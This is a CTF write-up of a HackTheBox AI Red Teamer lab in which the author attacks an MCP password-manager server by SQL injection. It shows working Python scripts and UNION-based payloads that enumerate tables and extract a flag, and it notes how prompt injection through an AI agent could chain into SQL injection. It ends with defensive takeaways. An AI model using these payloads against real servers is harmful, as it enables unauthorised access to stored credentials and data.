---
layout: default
title: "HTB - AI Red Teamer - Attacking AI - Application and System"
date: 2026-05-24
description: "Complete write up about the Attacking AI Applications and Systems skill assessment from HTB AI Red Teamer — exploiting an MCP server with SQL injection"
tags:
  [
    hackthebox,
    ctf,
    writeup,
    mcp,
    sql-injection,
    ai-security,
    application-security,
  ]
permalink: /writeups/htb-ai-red-teamer-attacking-ai-application-system/
---

## Introduction

This write-up covers the Skills Assessment from HackTheBox's AI Red Teamer module on attacking AI applications and systems. The target is a live **MCP (Model Context Protocol) server** belonging to a fictional company called **RootLocker**, a platform offering cloud document storage and password management.

The goal: identify security vulnerabilities in the MCP server implementation and extract the flag.

This is a classic example of an **inference-time attack on an AI-adjacent system**: the MCP server acts as a bridge between an AI agent and backend services. Poor input validation in that bridge opens the door to well-known web vulnerabilities, in this case, SQL injection in a context that most developers wouldn't think to harden.

---

## Table of Contents

- [Introduction](#introduction)
- [Understanding the Challenge](#understanding-the-challenge)
  - [The Setup](#the-setup)
  - [The Objective](#the-objective)
- [What is an MCP Server?](#what-is-an-mcp-server)
- [Step 1 — Reconnaissance on the MCP Server](#step-1--reconnaissance-on-the-mcp-server)
- [Step 2 — Reading Static Resources](#step-2--reading-static-resources)
- [Step 3 — Discovering the Password Resource Template](#step-3--discovering-the-password-resource-template)
- [Step 4 — Triggering the SQL Error](#step-4--triggering-the-sql-error)
- [Step 5 — Enumerating the Database Schema](#step-5--enumerating-the-database-schema)
- [Step 6 — Extracting the Flag](#step-6--extracting-the-flag)
- [Full Attack Script](#full-attack-script)
- [Key Takeaways](#key-takeaways)

---

## Understanding the Challenge

### The Setup

We are given:

- A target URL pointing to a running MCP server
- No credentials, no source code: black-box assessment
- The `fastmcp` Python library to interact with the MCP protocol

You are tasked with executing a security assessment of a customer's MCP server. The customer is RootLocker, a platform that provides cloud storage of documents as well as a password management service. Your goal is to identify security issues in the server implementation and obtain the flag.

### The Objective

Assess the security of RootLocker's MCP server implementation, identify any vulnerabilities, and retrieve the flag hidden somewhere in the backend.

---

## What is an MCP Server?

Before jumping into the attack, a quick primer on what we're targeting.

**MCP (Model Context Protocol)** is an open protocol that allows AI agents (like LLMs with tool use) to interact with external services in a standardized way. An MCP server exposes three types of primitives:

| Primitive              | What it does                                                           |
| ---------------------- | ---------------------------------------------------------------------- |
| **Resources**          | Static data an AI can read (documents, configs, stored values)         |
| **Resource Templates** | Parameterized resources — URIs with dynamic parts filled at query time |
| **Tools**              | Actions the AI can call (create, update, delete operations)            |

From a security perspective, MCP servers are interesting because they sit between an AI agent and backend infrastructure. Any input flowing through a resource template URI gets passed somewhere — often to a database or API — and if that input isn't properly sanitized, classic vulnerabilities like SQL injection apply just as much here as in a traditional web app.

---

## Step 1 — Reconnaissance on the MCP Server

The first thing to do with any MCP server is enumerate what it exposes. The MCP protocol itself provides introspection endpoints you can list all resources, templates, and tools without any authentication if the server doesn't restrict it.

Appending `/mcp` to the target URL confirms the server is running and accessible.

![image](/images/writeups/2026-05-22-Application-Systems/screen 1.png)

We use the following script to enumerate everything the server exposes:

```python
import asyncio
from fastmcp import Client

client = Client("http://YOURSERVER/mcp/")

async def main():
    async with client:
        resources = await client.list_resources()
        resource_templates = await client.list_resource_templates()
        tools = await client.list_tools()

        print("Resources:")
        for resource in resources:
            print('***')
            print(resource.name)
            print(resource.description.strip())

        print("-" * 50)
        print("Resource Templates:")
        for resource_template in resource_templates:
            print('***')
            print(resource_template.uriTemplate)
            print(resource_template.description.strip())

        print("-" * 50)
        print("Tools:")
        for tool in tools:
            print('***')
            params = list(tool.inputSchema.get('properties').keys())
            print(f"{tool.name}({','.join(params)})")
            print(tool.description.strip())

asyncio.run(main())
```

This gives us a full picture of the attack surface before we touch anything.

---

## Step 2 — Reading Static Resources

With the resource list in hand, we extend the script to read each static resource's content:

```python
        for resource in resources:
            print(f"\n[+] {resource.name} ({resource.uri})")
            try:
                result = await client.read_resource(resource.uri)
                print(result[0].text)
            except Exception as e:
                print(f"[-] {e}")
```

Among the results, we find a platform named **rootlocker.htb** listed as a stored entry.

![image](/images/writeups/2026-05-22-Application-Systems/screen 2.png)

---

## Step 3 — Discovering the Password Resource Template

The enumeration also revealed a **resource template** with a URI pattern in the format `password://{hostname}`. This is the password retrieval endpoint — given a hostname, it returns the stored password for that platform.

We query it directly for `rootlocker.htb`:

```python
        try:
            result = await client.read_resource("password://rootlocker.htb")
            print(result[0].text)
        except Exception as e:
            print(f"[-] {e}")
```

This returns `DummyPassword123`. Tempting, but there's nowhere to log in with it — this is just a placeholder in the dataset. What matters is that the backend is **actually querying a database** to fetch this value based on our input.

---

## Step 4 — Triggering the SQL Error

If user input is passed directly into a SQL query, a single quote `'` in the hostname will break the query syntax and cause the database to throw an error. We test this by appending a quote to the hostname:

```python
        try:
            result = await client.read_resource("password://rootlocker.htb'")
            print(result[0].text)
        except Exception as e:
            print(f"[-] {e}")
```

The error message is immediate and highly informative:

```text
[-] Error reading resource from template "password://rootlocker.htb'":
1064 (42000): You have an error in your SQL syntax; check the manual
that corresponds to your MariaDB server version for the right syntax
to use near ''rootlocker.htb'' LIMIT 1' at line 1
```

Two things confirmed here:

- The input is **not sanitized** — our quote broke the query directly
- The backend is **MariaDB** — we can see the database engine name in the error

This is a classic **error-based SQL injection**. The server handed us the backend stack on a plate. Note that the hostname in the URI has to be **URL-encoded** before being sent — the MCP client handles this, but it's why we're encoding special characters like `%20` (space), `%3D` (`=`), and `%23` (`#`) in the payloads below.

---

## Step 5 — Enumerating the Database Schema

Now that we have confirmed SQL injection, the next step is to figure out what tables exist in the current database. We use a **UNION-based** injection to append our own SELECT to the original query.

The payload selects all table names from `information_schema.tables` for the current database and concatenates them with `group_concat`:

```python
        try:
            result = await client.read_resource(
                "password://x'%20UNION%20SELECT%20group_concat(table_name)"
                "%20FROM%20information_schema.tables"
                "%20WHERE%20table_schema%3Ddatabase()%23"
            )
            print(result[0].text)
        except Exception as e:
            print(f"[-] {e}")
```

Decoded, the injected SQL reads:

```sql
x' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()#
```

The `x'` closes the original string value with a fake hostname that won't match anything, the `UNION SELECT` appends our row, and the `#` comments out the rest of the original query (including the trailing `LIMIT 1`).

The response reveals two tables: **`flag`** and **`passwords`**.

---

## Step 6 — Extracting the Flag

With the table name confirmed, we craft a final payload to read the `flag` column directly from the `flag` table:

```python
        try:
            result = await client.read_resource(
                "password://x'%20UNION%20SELECT%20flag%20FROM%20flag%20%23"
            )
            print(result[0].text)
        except Exception as e:
            print(f"[-] {e}")
```

Decoded:

```sql
x' UNION SELECT flag FROM flag #
```

The flag is returned as the resource value.

---

## Full Attack Script

Here is the complete script that chains all steps together:

```python
import asyncio
from fastmcp import Client

TARGET = "http://YOURSERVER/mcp/"

async def main():
    async with Client(TARGET) as client:

        # Step 1 — Enumerate the server
        print("[*] Enumerating MCP server...")
        resources = await client.list_resources()
        resource_templates = await client.list_resource_templates()
        tools = await client.list_tools()

        print("\nResources:")
        for resource in resources:
            print(f"  - {resource.name}: {resource.description.strip()}")

        print("\nResource Templates:")
        for rt in resource_templates:
            print(f"  - {rt.uriTemplate}: {rt.description.strip()}")

        print("\nTools:")
        for tool in tools:
            params = list(tool.inputSchema.get('properties').keys())
            print(f"  - {tool.name}({', '.join(params)}): {tool.description.strip()}")

        # Step 2 — Read all static resources
        print("\n[*] Reading static resources...")
        for resource in resources:
            print(f"\n[+] {resource.name} ({resource.uri})")
            try:
                result = await client.read_resource(resource.uri)
                print(result[0].text)
            except Exception as e:
                print(f"[-] {e}")

        # Step 3 — Query the password template normally
        print("\n[*] Querying password for rootlocker.htb...")
        try:
            result = await client.read_resource("password://rootlocker.htb")
            print(result[0].text)
        except Exception as e:
            print(f"[-] {e}")

        # Step 4 — Confirm SQL injection with a quote
        print("\n[*] Testing SQL injection...")
        try:
            result = await client.read_resource("password://rootlocker.htb'")
            print(result[0].text)
        except Exception as e:
            print(f"[-] SQL error (injection confirmed): {e}")

        # Step 5 — Enumerate tables
        print("\n[*] Enumerating database tables...")
        try:
            result = await client.read_resource(
                "password://x'%20UNION%20SELECT%20group_concat(table_name)"
                "%20FROM%20information_schema.tables"
                "%20WHERE%20table_schema%3Ddatabase()%23"
            )
            print(f"Tables: {result[0].text}")
        except Exception as e:
            print(f"[-] {e}")

        # Step 6 — Extract the flag
        print("\n[*] Extracting flag...")
        try:
            result = await client.read_resource(
                "password://x'%20UNION%20SELECT%20flag%20FROM%20flag%20%23"
            )
            print(f"FLAG: {result[0].text}")
        except Exception as e:
            print(f"[-] {e}")

asyncio.run(main())
```

---

## Key Takeaways

**1. MCP servers are web services — web vulnerabilities apply.**
The MCP protocol is built on HTTP. Resource template URIs flow into backend queries just like HTTP parameters do in a traditional web app. If the team securing an MCP server doesn't think of it as a web endpoint, they won't apply the same controls.

**2. Error messages are an attacker's best friend.**
The server returned the full MariaDB error including the broken query. In production, database errors should never reach the client. A generic "resource not found" response would have slowed down this attack considerably.

**3. AI agents are only as secure as their tool implementations.**
An LLM using this MCP server could be manipulated into querying arbitrary data by injecting SQL through its prompts — a prompt injection leading to SQL injection. The attack surface compounds when AI is in the loop.

**4. Parameterized queries eliminate this entirely.**
The fix is straightforward: use prepared statements or parameterized queries instead of string concatenation when building SQL from URI inputs. No amount of input filtering is as reliable as never interpolating user input into SQL directly.

**5. Enumeration is always the first step.**
The MCP protocol's built-in introspection — `list_resources`, `list_resource_templates`, `list_tools` — gave us a complete map of the attack surface with zero guessing. Unauthenticated enumeration is itself a finding worth reporting.

---
